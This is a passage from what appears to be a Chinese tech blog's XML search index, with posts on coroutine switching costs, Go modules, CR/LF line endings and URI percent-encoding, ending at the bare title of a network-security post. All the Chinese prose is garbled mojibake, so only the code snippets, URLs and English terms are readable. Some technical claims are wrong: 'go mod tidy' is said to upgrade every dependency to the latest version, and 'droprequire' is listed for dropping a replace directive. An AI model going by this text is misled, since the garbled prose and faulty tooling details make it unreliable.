<li>å‡å°‘ä¸Šé”é¢‘ç‡ã€‚å› ä¸ºåç¨‹éƒ½æ˜¯è·‘åœ¨ä¸€ä¸ªçº¿ç¨‹é‡Œçš„ï¼Œä¸”éƒ½æ˜¯éæŠ¢å å¼è°ƒåº¦ï¼Œæ‰€ä»¥ä¸ç”¨æ‹…å¿ƒæŒ‡ä»¤æ‰§è¡Œåˆ°ä¸€åŠè¢«å¤ºå»è¿è¡Œæƒé™çš„é—®é¢˜ã€‚ä½†æ˜¯å¦‚æœåç¨‹é—´å­˜åœ¨ç«äº‰ï¼Œå¹¶ä¸èƒ½ä¿è¯ä¸´ç•ŒåŒºï¼Œæ‰€ä»¥ä¹Ÿä¸æ˜¯å®Œå…¨ä¸éœ€è¦é”ã€‚</li>
</ol>
<p>åç¨‹çš„ç¼ºç‚¹ï¼š</p>
<ol>
<li>æ— æ³•å……åˆ†åˆ©ç”¨å¤šæ ¸èµ„æºï¼Œå› ä¸ºæ‰€æœ‰åç¨‹éƒ½æ˜¯å±äºä¸€ä¸ªçº¿ç¨‹çš„ï¼Œåç¨‹éœ€è¦å’Œè¿›ç¨‹é…åˆæ‰èƒ½è¿è¡Œåœ¨å¤šæ ¸ CPU ä¸Š</li>
<li>æ‰§è¡Œçº¿ç¨‹çº§çš„é˜»å¡æ“ä½œä¼šé˜»å¡æ‰æ•´ä¸ªç¨‹åº</li>
</ol>
<h2 id="è¿›ç¨‹ã€çº¿ç¨‹å’Œåç¨‹çš„è°ƒåº¦æˆæœ¬å¯¹æ¯”"><a href="#è¿›ç¨‹ã€çº¿ç¨‹å’Œåç¨‹çš„è°ƒåº¦æˆæœ¬å¯¹æ¯”" class="headerlink" title="è¿›ç¨‹ã€çº¿ç¨‹å’Œåç¨‹çš„è°ƒåº¦æˆæœ¬å¯¹æ¯”"></a>è¿›ç¨‹ã€çº¿ç¨‹å’Œåç¨‹çš„è°ƒåº¦æˆæœ¬å¯¹æ¯”</h2><p>è¿›ç¨‹çš„åˆ‡æ¢å¸¦æ¥ä»¥ä¸‹<strong>ç›´æ¥å¼€é”€</strong>ï¼š</p>
<ul>
<li>é™·å…¥å†…æ ¸</li>
<li>åˆ‡æ¢é¡µè¡¨ï¼Œåˆ·æ–° TLB</li>
<li>ä¿å­˜å¯„å­˜å™¨å€¼ç­‰ç¡¬ä»¶ä¸Šä¸‹æ–‡</li>
<li>æ›´æ–° PCB ä¸­çš„ä¿¡æ¯ï¼ˆæ”¹æ‰è¿›ç¨‹çš„â€œè¿è¡Œæ€â€ï¼‰ï¼ŒæŠŠ PCB æ”¾å…¥ç›¸å…³çš„çŠ¶æ€é˜Ÿåˆ—</li>
</ul>
<p>æ­¤å¤–è¿˜æœ‰ç”±äº Cache å¤§è§„æ¨¡å¤±æ•ˆå¸¦æ¥çš„<strong>é—´æ¥å¼€é”€</strong>ï¼Œå³åŸè¿›ç¨‹ç¼“å­˜ä¸‹æ¥çš„æŒ‡ä»¤å’Œæ•°æ®ç»Ÿç»Ÿå¤±æ•ˆï¼ŒCPU éœ€è¦ç›´æ¥è®¿é—®å†…å­˜çš„é¢‘ç‡å¢åŠ ã€‚</p>
<p>ä¸è¿›ç¨‹ç›¸æ¯”ï¼Œçº¿ç¨‹åˆ‡æ¢çš„å¼€é”€å°±å°äº†å¾ˆå¤šï¼Œä¸»è¦ä½“ç°åœ¨çœç•¥äº†åˆ‡æ¢è™šæ‹Ÿåœ°å€ç©ºé—´è¿™ä¸€æ­¥ï¼š</p>
<ul>
<li>é™·å…¥å†…æ ¸</li>
<li>ä¿å­˜å¯„å­˜å™¨å€¼ç­‰ç¡¬ä»¶ä¸Šä¸‹æ–‡</li>
<li>æ›´æ–° TCB ä¸­çš„ä¿¡æ¯ï¼ˆæ”¹æ‰çº¿ç¨‹çš„â€œè¿è¡Œæ€â€ï¼‰ï¼ŒæŠŠ TCB æ”¾å…¥ç›¸å…³çš„çŠ¶æ€é˜Ÿåˆ—</li>
</ul>
<p>è€Œåç¨‹çš„åˆ‡æ¢å°±æ›´è½»é‡çº§äº†ï¼Œå®ƒå¹²è„†è¿å†…æ ¸æ€ä¹Ÿä¸é™·å…¥äº†ï¼š</p>
<ul>
<li>ä¿å­˜å¯„å­˜å™¨å€¼ç­‰ç¡¬ä»¶ä¸Šä¸‹æ–‡</li>
<li>æ›´æ–°åç¨‹çŠ¶æ€ï¼ˆæ”¹æ‰åç¨‹çš„â€œè¿è¡Œæ€â€ï¼‰ï¼ŒæŠŠåç¨‹æ”¾å…¥ç›¸å…³çš„çŠ¶æ€é˜Ÿåˆ—</li>
</ul>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>å¹¶å‘ç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼€å§‹ä½ çš„Go Moduleä¹‹è·¯</title>
    <url>/2020/02/21/%E5%BC%80%E5%A7%8B%E4%BD%A0%E7%9A%84Go-Module%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<p>åœ¨ go çš„å†å²ä¸Šå‡ºç°è¿‡ä¸€å¤§æ‰¹åŒ…ç®¡ç†å·¥å…·ï¼Œå¦‚ depï¼Œvendor ç­‰ã€‚è‡ª go1.12 ä»¥æ¥å®˜æ–¹å¼•å…¥äº† go module æ¥è§£å†³è¿™ä¸ªä¹±è±¡ã€‚</p>
<h2 id="ä»-GOPATH-è¯´èµ·"><a href="#ä»-GOPATH-è¯´èµ·" class="headerlink" title="ä» GOPATH è¯´èµ·"></a>ä» GOPATH è¯´èµ·</h2><p>GOPATH æ˜¯æœ€æ—©çš„ go åŒ…ç®¡ç†æ–¹æ¡ˆï¼Œå®‰è£… golang ä¹‹åéœ€è¦é…ç½®ä¸¤ä¸ªç¯å¢ƒå˜é‡ <code>GOROOT</code> ä¸ <code>GOPATH</code>, å‰è€…æ˜¯ go å®‰è£…ç›®å½•ï¼Œåè€…æ˜¯å¼€å‘è€…è‡ªå®šä¹‰çš„ç”¨äºå­˜æ”¾ä»£ç çš„åœ°æ–¹ã€‚GOPATH ä¸‹å­˜åœ¨ä¸‰ä¸ªç›®å½•ï¼š</p>
<ul>
<li>bin: å­˜æ”¾ç¼–è¯‘åçš„å¯æ‰§è¡Œæ–‡ä»¶</li>
<li>pkg: å­˜æ”¾ go çš„é“¾æ¥æ–‡ä»¶(suffix = .a)</li>
<li>src: å­˜æ”¾æºä»£ç </li>
</ul>
<p>å¹³æ—¶æˆ‘ä»¬çš„é¡¹ç›®å°±æ”¾åœ¨ src ä¸‹ï¼Œæ¯ä¸ªé¡¹ç›®ä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚æ¯å½“æˆ‘ä»¬ç”¨ import è¯­å¥å¯¼å…¥åŒ…ï¼Œgo ä¼šä» <code>$GOROOT/src</code> å’Œ <code>$GOPATH/src</code> æŸ¥æ‰¾åŒ¹é…çš„ç›®å½•ã€‚ä¸¾ä¸ªæ —å­ï¼Œå‡è®¾æˆ‘çš„ GOPATH æ˜¯ E:\goï¼Œåœ¨ src ä¸‹åˆ›å»ºä¸€ä¸ªé¡¹ç›® serviceï¼Œé‡Œé¢æœ‰ä¸ª main.go æ–‡ä»¶å’Œ test åŒ…ï¼š</p>
<p><img src="https://i.loli.net/2020/02/21/B9VCsnjychDQTJ4.png" alt="service"></p>
<p>main.go æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/ramya-rao-a/go-outline&quot;</span></span><br><span class="line">    <span class="string">&quot;./test&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// your code</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>fmt æ˜¯ go è‡ªå¸¦çš„åŒ…ï¼Œä½äº $GOROOT/src/fmtï¼›github.com/ramya-rao-a/go-outline æ˜¯ç¬¬ä¸‰æ–¹åŒ…ï¼Œä½äº $GOPATH/src/github.com/ramya-rao-a/go-outlineï¼›test æ˜¯è‡ªå®šä¹‰åŒ…ï¼Œ<code>.</code> è¡¨ç¤º mian.go æ‰€åœ¨æ–‡ä»¶å¤¹ï¼Œä½äº $GOPATH/src/service/test</p>
<h2 id="ç°èº«å§ï¼ŒGo-module"><a href="#ç°èº«å§ï¼ŒGo-module" class="headerlink" title="ç°èº«å§ï¼ŒGo module!"></a>ç°èº«å§ï¼ŒGo module!</h2><p>è®²äº†ä¸€å¤§å †ï¼Œæ˜¯æ—¶å€™è¿›å…¥æ­£é¢˜äº†ã€‚å‰é¢è®²åˆ©ç”¨ GOPATH è¿›è¡ŒåŒ…ç®¡ç†è¿™ä¸ªæ–¹æ³•æ˜¯åœ¨æ˜¯å¤ªéº»çƒ¦äº†ï¼Œæ¯ä¸ªé¡¹ç›®éƒ½è¦é…ä¸€ä¸ªä¸“å±çš„ GOPATHï¼Œä¸ç„¶å„ä¸ªé¡¹ç›®çš„åŒ…å°±ä¼šæ··åœ¨ä¸€èµ·ã€‚</p>
<p>go1.12 åï¼Œè®¾ç½®ç¯å¢ƒå˜é‡ <code>GO111MODULE=on</code>ï¼Œæ¯ä¸ªè½¯ä»¶åŒ…éƒ½å¯ä»¥å£°æ˜ä¸ºä¸€ä¸ª moduleã€‚æ¯ä¸ª module çš„ä¾èµ–åŒ…éƒ½ä¼šæ”¾åœ¨ $GOPATH/pkg/mod ä¸‹ã€‚å¦‚æœæ²¡æœ‰è®¾ç½® GOPATH ä¹Ÿæ²¡å…³ç³»ï¼Œgo ä¼šåœ¨ç”¨æˆ·çš„ $home ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª go æ–‡ä»¶å¤¹ä½œä¸ºé»˜è®¤çš„ GOPATH</p>
<h2 id="å£°æ˜-module"><a href="#å£°æ˜-module" class="headerlink" title="å£°æ˜ module"></a>å£°æ˜ module</h2><p>modulename æ˜¯ä»»æ„çš„ã€‚å¦‚æœæƒ³æŠŠè¿™ä¸ªåŒ…å‘å¸ƒå‡ºå»ï¼Œæœ€å¥½è¿˜æ˜¯æŒ‰ github.com/user/xxxx çš„å½¢å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go mod init &lt;modulename&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸¾ä¸ªæ —å­ï¼Œè¿˜æ˜¯é‚£ä¸ª service é¡¹ç›®ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go mod init github.com/yue-qiu/service</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ï¼Œåœ¨è¿™ä¸ªé¡¹ç›®é‡Œï¼Œgithub.com/yue-qiu/service å°±æ˜¯è¿™ä¸ªé¡¹ç›®çš„æ ¹ç›®å½•ã€‚main.go æ”¹å†™ä¸ºï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/ramya-rao-a/go-outline&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/yue-qiu/service/test&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// your code</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><p>go mod å‘½ä»¤æä¾›äº†ä¸€ç³»åˆ—ä¸ module ç›¸å…³çš„ç”¨æ³•ï¼š</p>
<p><img src="https://i.loli.net/2020/02/22/qk9bN2IMT48OSza.png" alt="module"></p>
<ul>
<li>go mod download: æ ¹æ® go.mod ä¸­çš„å†…å®¹æ‹‰å–ä¾èµ–åŒ…åˆ°æœ¬åœ°</li>
<li>go mod tidy: æ ¹æ®é¡¹ç›®çš„å¯¼å…¥ä¿¡æ¯å¾€ go.mod ä¸­æ·»åŠ ã€åˆ é™¤ä¾èµ–åŒ…è®°å½•ã€‚å»ºè®®å°‘ç”¨ï¼Œå› ä¸ºå®ƒä¼šè‡ªåŠ¨æŠŠæ‰€æœ‰ä¾èµ–åŒ…å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬</li>
<li>go mod graph: æ‰“å°é¡¹ç›®çš„ä¾èµ–å…³ç³»å›¾</li>
<li>go mod vendor: å°† go.mod ä¸­è®°å½•çš„ä¾èµ–åŒ…ç¼“å­˜åˆ°ä¸€ä¸ª vendor ç›®å½•ï¼Œè¿™æ ·åœ¨æ²¡ç½‘çš„æƒ…å†µä¸‹ä¹Ÿèƒ½ç¼–è¯‘é¡¹ç›®äº†</li>
<li>go mod edit [flag]: [flag] åˆåˆ†å¥½å‡ ç§ï¼š<ul>
<li>fmt: æ ¼å¼åŒ– go.mod</li>
<li>require=path@version or droprequire=path@version: æ·»åŠ ä¾èµ– or åˆ é™¤ä¾èµ–</li>
<li>replace=oldpath=newpath or droprequire=oldpath: æ›¿æ¢ä¾èµ–</li>
</ul>
</li>
</ul>
<p>è¿™é‡Œé‡ç‚¹è¯´ä¸‹ -replace é€‰é¡¹ï¼Œå› ä¸ºåœ¨ç”Ÿäº§ä¸­ç»å¸¸é‡åˆ°çš„ä¸€ç§æƒ…å†µæ˜¯ç”±äºè¿™æ ·é‚£æ ·çš„åŸå› æˆ‘ä»¬éœ€è¦ fork ä¸€ä¸ªç§æœ‰ä»“åº“å»æ”¹åŠ¨ç¬¬ä¸‰æ–¹å¼€æºåº“ï¼Œä¾‹å¦‚æœ‰ä¸ªå°å“¥é’ˆå¯¹ logrus åšäº†äºŒæ¬¡å¼€å‘ github.com/gogap/logrusï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨ github.com/gogap/logrus æ›¿æ¢ä¹‹å‰çš„ç¬¬ä¸‰æ–¹å¼€æºåº“ github.com/sirupsen/logrusï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go mod edit -replace=<span class="string">&quot;github.com/sirupsen/logrus=github.com/gogap/logrus@v0.8.2&quot;</span></span><br><span class="line"></span><br><span class="line">$ cat go.mod</span><br><span class="line"></span><br><span class="line">module <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">go 1.12</span><br><span class="line"></span><br><span class="line">require github.com/sirupsen/logrus v1.4.2</span><br><span class="line"></span><br><span class="line">replace github.com/sirupsen/logrus =&gt; github.com/gogap/logrus v0.8.2</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>å›è½¦ or æ¢è¡Œï¼Ÿ</title>
    <url>/2020/02/16/%E5%9B%9E%E8%BD%A6-or-%E6%8D%A2%E8%A1%8C%EF%BC%9F/</url>
    <content><![CDATA[<p>ä»¥å‰ç¼–ç¨‹çš„æ—¶å€™ä¸€ç›´æ²¡æ³¨æ„å›è½¦ç¬¦ä¸æ¢è¡Œç¬¦çš„åŒºåˆ«ï¼Œåªæ˜¯å¤§æ¦‚çŸ¥é“ä¸€ä¸ªæ˜¯ \r ä¸€ä¸ªæ˜¯ \nã€‚ä»Šå¤©å¿ƒè¡€æ¥æ½®æŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°è¿™è¿˜è›®æœ‰è¶£çš„~</p>
<span id="more"></span>

<h2 id="å›è½¦"><a href="#å›è½¦" class="headerlink" title="å›è½¦"></a>å›è½¦</h2><p>åŸå Carriage Returnï¼ŒASCII ç  13ã€‚è¡¨ç¤ºå…‰æ ‡å›åˆ°è¡Œé¦–ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello\rworld&quot;</span>)</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment">#   world</span></span><br></pre></td></tr></table></figure>

<h2 id="æ¢è¡Œ"><a href="#æ¢è¡Œ" class="headerlink" title="æ¢è¡Œ"></a>æ¢è¡Œ</h2><p>åŸå Line Feedï¼ŒASCII ç  10ã€‚è¡¨ç¤ºå…‰æ ‡ç§»åŠ¨åˆ°ä¸‹ä¸€è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello\nworld&quot;</span>)</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment">#   hello</span></span><br><span class="line"><span class="comment">#   world</span></span><br></pre></td></tr></table></figure>

<h2 id="æ¸Šæº"><a href="#æ¸Šæº" class="headerlink" title="æ¸Šæº"></a>æ¸Šæº</h2><p>åœ¨è®¡ç®—æœºè¿˜æ²¡æœ‰å‡ºç°ä¹‹å‰ï¼Œæœ‰ä¸€ç§å«åšç”µä¼ æ‰“å­—æœºï¼ˆTeletype Model 33ï¼‰çš„ç©æ„ï¼Œæ¯ç§’é’Ÿå¯ä»¥æ‰“ 10 ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯å®ƒæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ‰“å®Œä¸€è¡Œæ¢è¡Œçš„æ—¶å€™ï¼Œè¦ç”¨å» 0.2 ç§’ï¼Œæ­£å¥½å¯ä»¥æ‰“ä¸¤ä¸ªå­—ç¬¦ã€‚è¦æ˜¯åœ¨è¿™0.2ç§’é‡Œé¢ï¼Œåˆæœ‰æ–°çš„å­—ç¬¦ä¼ è¿‡æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªå­—ç¬¦å°†ä¸¢å¤±ã€‚</p>
<p><img src="https://i.loli.net/2020/02/16/kMxhL2pTCwBZASi.png" alt="æ‰“å­—æœº"></p>
<p>äºæ˜¯ï¼Œç ”åˆ¶äººå‘˜æƒ³äº†ä¸ªåŠæ³•è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åœ¨æ¯è¡Œåé¢åŠ ä¸¤ä¸ªè¡¨ç¤ºç»“æŸçš„å­—ç¬¦ã€‚ä¸€ä¸ªå«åšâ€œå›è½¦â€ï¼Œå‘Šè¯‰æ‰“å­—æœºæŠŠæ‰“å°å¤´å®šä½åœ¨å·¦è¾¹ç•Œï¼›å¦ä¸€ä¸ªå«åšâ€œæ¢è¡Œâ€ï¼Œå‘Šè¯‰æ‰“å­—æœºæŠŠçº¸å‘ä¸‹ç§»ä¸€è¡Œã€‚<br>è¿™å°±æ˜¯â€œæ¢è¡Œâ€å’Œâ€œå›è½¦â€çš„æ¥å†ï¼Œä»å®ƒä»¬çš„è‹±è¯­åå­—ä¸Šä¹Ÿå¯ä»¥çœ‹å‡ºä¸€äºŒã€‚è‡³äºä¸ºä»€ä¹ˆå›è½¦åœ¨å‰æ¢è¡Œåœ¨åå‘¢ï¼Ÿå› ä¸ºå›è½¦éœ€è¦çš„æ—¶é—´æ›´é•¿ï¼Œæœºå™¨å¯ä»¥åˆ©ç”¨è¿™ä¸ªé—´éš™å®Œæˆæ¢è¡Œæ“ä½œã€‚</p>
<p>åæ¥ï¼Œè®¡ç®—æœºå‘æ˜äº†ï¼Œè¿™ä¸¤ä¸ªæ¦‚å¿µä¹Ÿå°±è¢«èˆ¬åˆ°äº†è®¡ç®—æœºä¸Šã€‚é‚£æ—¶ï¼Œå­˜å‚¨å™¨å¾ˆè´µï¼Œä¸€äº›ç§‘å­¦å®¶è®¤ä¸ºåœ¨æ¯è¡Œç»“å°¾åŠ ä¸¤ä¸ªå­—ç¬¦å¤ªæµªè´¹äº†ã€‚äºæ˜¯ï¼Œå°±å‡ºç°äº†åˆ†æ­§ï¼š</p>
<ul>
<li>\r\n: Windows ç³»ç»Ÿè¡Œæœ«ç»“æŸç¬¦</li>
<li>\r: Mac ç³»ç»Ÿè¡Œæœ«ç»“æŸç¬¦</li>
<li>\n: Unix ç³»ç»Ÿè¡Œæœ«ç»“æŸç¬¦</li>
</ul>
<p>ä¸€ä¸ªç›´æ¥åæœæ˜¯ï¼ŒUnix/Mac ç³»ç»Ÿä¸‹çš„æ–‡ä»¶åœ¨ Windows é‡Œæ‰“å¼€çš„è¯ï¼Œæ‰€æœ‰æ–‡å­—ä¼šå˜æˆä¸€è¡Œï¼›è€Œ Windows é‡Œçš„æ–‡ä»¶åœ¨ Unix/Mac ä¸‹æ‰“å¼€çš„è¯ï¼Œåœ¨æ¯è¡Œçš„ç»“å°¾å¯èƒ½ä¼šå¤šå‡ºä¸€ä¸ª ^M ç¬¦å·ã€‚</p>
<p>æ€»ç»“ï¼šè™½ç„¶ä¸åŒæ“ä½œç³»ç»Ÿå¯¹è¡Œæœ«ç»“æŸç¬¦çš„å®šä¹‰ä¸åŒï¼Œä½† \r\n æ˜¯å†å²ä¼ ç»Ÿè€Œä¸”è¢«å¤šä¸ªæ ‡å‡†ï¼ˆå¦‚ HTTPï¼ŒSMTPï¼‰æ‰€é‡‡çº³ï¼Œæ‰€ä»¥å®é™…ä½¿ç”¨ä¸­è¿˜æ˜¯ä»¥ \r\n å±…å¤šã€‚</p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>ç¼–ç </tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘ç»œé‚£äº›äº‹ä¹‹URI</title>
    <url>/2020/02/13/URI%E4%B8%8EURL/</url>
    <content><![CDATA[<p>URI(Uniform Resource Identifier)ï¼šç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼Œç”¨äº<strong>å”¯ä¸€æ ‡è¯†ä¸€ä¸ªèµ„æº</strong>ã€‚</p>
<p>URL(Uniform Resource Locator)ï¼šç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼Œè¡¨æ˜åœ¨ä¸€ä¸ªèµ„æºåœ¨ç½‘ç»œä¸­çš„è®¿é—®æ–¹å¼ã€‚é€šå¸¸è¡¨ç°ä¸º <code>åè®®+è·¯å¾„+å‚æ•°</code></p>
<p>URN(Uniform Resource Name)ï¼šç»Ÿä¸€èµ„æºå®šä½åç§°ï¼Œé€šè¿‡æŸä¸ªå‘½åç©ºé—´ä¸­çš„å”¯ä¸€ ID æ¥æ ‡è¯†ä¸€ä¸ªèµ„æº</p>
<p><img src="https://i.loli.net/2020/02/13/2XjAU6Phz9ONJQq.png" alt="URI"></p>
<p>ä¸¾ä¸ªä¾‹å­ï¼šå°çº¢çš„å­¦å·æ˜¯ 123456ï¼Œè¿™ä¸ªå­¦å·å°±æ˜¯ URNï¼Œèƒ½å¯¹åº”åˆ°å°çº¢è¿™ä¸ªäººï¼›å°çº¢çš„å®¶åº­ä½å€æ˜¯ç¿»æ–—å¤§è¡—ç¿»æ–—èŠ±å›­äºŒå·æ¥¼ä¸€é›¶é›¶ä¸€å®¤ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯ URLï¼Œå»é‚£é‡Œå°±èƒ½æ‰¾åˆ°å°çº¢ã€‚å°çº¢çš„å­¦å·ã€å°çº¢çš„ä½å€éƒ½å±äº URIã€‚</p>
<h2 id="URI-çš„æ ¼å¼"><a href="#URI-çš„æ ¼å¼" class="headerlink" title="URI çš„æ ¼å¼"></a>URI çš„æ ¼å¼</h2><p>ä¸€ä¸ªæ ‡å‡†çš„ URI æ ¼å¼ä¸ºï¼š<code>[scheme:]scheme-specific-part</code>ï¼Œå¦‚ï¼š<a href="http://qiuyueqy.com/">http://qiuyueqy.com</a>, mailto:<a href="mailto:&#113;&#105;&#x75;&#121;&#117;&#101;&#x39;&#57;&#x37;&#x31;&#x40;&#x31;&#x32;&#x36;&#46;&#99;&#x6f;&#x6d;">&#113;&#105;&#x75;&#121;&#117;&#101;&#x39;&#57;&#x37;&#x31;&#x40;&#x31;&#x32;&#x36;&#46;&#99;&#x6f;&#x6d;</a>, news:comp.go.lang</p>
<p>URI å¯ä»¥ç»†åˆ†ä¸ºä¸º<code>ä¸é€æ˜çš„(opaque)</code>å’Œ<code>åˆ†å±‚çš„(hierarchical)</code>ä¸¤ç±»ï¼š</p>
<ul>
<li>opaque æŒ‡ scheme-specific-part ä¸ä»¥ / å¼€å¤´ï¼Œæ˜¯ä¸€ä¸ªæ•´ä½“ã€‚å‘ˆ [scheme]:opaque[?query][#fragment] çš„å½¢å¼ã€‚å¦‚ï¼šmailto:<a href="mailto:&#113;&#x69;&#x75;&#121;&#117;&#101;&#x39;&#x39;&#x37;&#x31;&#64;&#49;&#x32;&#54;&#46;&#99;&#111;&#109;">&#113;&#x69;&#x75;&#121;&#117;&#101;&#x39;&#x39;&#x37;&#x31;&#64;&#49;&#x32;&#54;&#46;&#99;&#111;&#109;</a>ï¼Œ<a href="http://www.google.com:443/">www.google.com:443</a>, opaque å¿…é¡»æ˜¯ç»å¯¹çš„ã€‚</li>
<li>hierarchical æŒ‡ scheme-specific-part ä»¥ / å¼€å¤´ä¸”å¯ä»¥åˆ’åˆ†ä¸ºå¥½å‡ éƒ¨åˆ†ã€‚å‘ˆ [scheme:][//[userinfo@]host[:port]]path[?query][#fragment] çš„å½¢å¼ã€‚å¦‚ï¼š<a href="http://qiuyueqy.com/categories/">http://qiuyueqy.com/categories/</a>, hierarchical å¯ä»¥æ˜¯ç»å¯¹çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹çš„ï¼Œå¦‚ï¼š<a href="https://github.com/yue-qiu/CUG_EmptyClassroom">https://github.com/yue-qiu/CUG_EmptyClassroom</a>, ../../static/verify.js</li>
</ul>
<h2 id="è°ˆè°ˆ-URI-ç¼–ç "><a href="#è°ˆè°ˆ-URI-ç¼–ç " class="headerlink" title="è°ˆè°ˆ URI ç¼–ç "></a>è°ˆè°ˆ URI ç¼–ç </h2><p>åˆ©ç”¨ URI ä¼ å‚æ—¶ï¼Œå¦‚æœæŸäº› URI ç»„ä»¶å­—ç¬¦ï¼ˆå¦‚ /:?@&amp;=+$,#ï¼‰åŒæ—¶ä¹Ÿæ˜¯å‚æ•°çš„ä¸€éƒ¨åˆ†ä¼šå¯¼è‡´ URI æ­§ä¹‰ã€‚æ­¤å¤–ï¼ŒURI åªæ”¯æŒ ASCII ç¼–ç ï¼Œå¯¹äºèŒ«èŒ«å¤šçš„ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ï¼šå¹¿ä¸œçœï¼‰å¦‚ä½•è¡¨ç¤ºï¼Ÿ</p>
<p>æ‰€è°“åŠæ³•æ€»æ¯”å›°éš¾å¤šï¼Œä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼ŒURI ç¼–ç åº”è¿è€Œç”Ÿã€‚ä¸¾ä¸ªæ —å­ï¼Œå¯¹ä¸‹é¢è¿™ä¸ªæœªç»ç¼–ç çš„ URIï¼š</p>
<blockquote>
<p><a href="http://qiuyueqy.com/?page=2&amp;category=%E5%B9%BF%E4%B8%9C">http://qiuyueqy.com/?page=2&amp;category=å¹¿ä¸œ</a></p>
</blockquote>
<p>è¦è¡¨ç¤ºç‰¹æ®Šå­—ç¬¦ï¼Œæˆ‘ä»¬æŠŠå®ƒæŒ‰æŸä¸ªå­—ç¬¦é›†ï¼ˆé€šå¸¸æ˜¯ UTF-8ï¼‰ç¼–ç æˆåå…­è¿›åˆ¶çš„ <code>%hh</code> å½¢å¼ï¼š</p>
<blockquote>
<p><a href="http://qiuyueqy.com/?page=2&amp;category=%E5%B9%BF%E4%B8%9C">http://qiuyueqy.com?page=2&amp;category=%E5%B9%BF%E4%B8%9C</a></p>
</blockquote>
<p>å¦‚æœè¿™ä¸ª URI æ˜¯å¦ä¸€ä¸ª URI çš„å‚æ•°ï¼Œå¦‚</p>
<blockquote>
<p><a href="http://www.google.com/?callback=http://qiuyueqy.com/?page=2&amp;category=%E5%B9%BF%E4%B8%9C">http://www.google.com?callback=http://qiuyueqy.com/?page=2&amp;category=å¹¿ä¸œ</a></p>
</blockquote>
<p>æ˜¾ç„¶ï¼Œç”±äºå‚æ•°ä¸­ /ã€? ç­‰ç»„ä»¶å­—ç¬¦çš„å­˜åœ¨ï¼Œä¸Šé¢è¿™ä¸ª URI çš„è§£é‡Šæ˜¯æœ‰æ­§ä¹‰çš„ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬æŠŠæ•´ä¸ªå›è°ƒ URIï¼ˆåŒ…æ‹¬å®ƒçš„ç»„ä»¶å­—ç¬¦ï¼‰è¿›è¡Œç¼–ç ï¼Œå†ä½œä¸ºå‚æ•°å°±æ²¡é—®é¢˜äº†ï¼š</p>
<blockquote>
<p><a href="http://www.google.com/?callback=http://qiuyueqy.com/?page=2&category=%E5%B9%BF%E4%B8%9C">http://www.google.com?callback=http%3A%2F%2Fqiuyueqy.com%2F%3Fpage%3D2%26category%3D%E5%B9%BF%E4%B8%9C</a></p>
</blockquote>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç½‘ç»œ</category>
      </categories>
      <tags>
        <tag>åº”ç”¨å±‚</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘ç»œé‚£äº›äº‹ä¹‹ç½‘ç»œå®‰å…¨</title>
    <url>/2020/02/06/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
